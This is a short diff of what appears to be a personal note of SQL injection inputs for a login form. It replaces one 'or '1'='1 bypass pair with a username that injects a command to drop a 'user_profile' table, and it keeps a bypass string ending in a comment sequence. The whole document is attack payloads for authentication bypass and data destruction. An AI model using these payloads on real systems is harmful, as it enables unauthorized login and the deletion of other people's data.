@@ -1,5 +1,5 @@
-username:(space here) 'or '1'='1
-password:(space here) 'or '1'='1
-
 username:(space here) 'or '1'='1'; --+'
+password:Any Word
+
+username:(space here) 'or '1'='1'; drop table user_profile; --+'
 password:Any Word
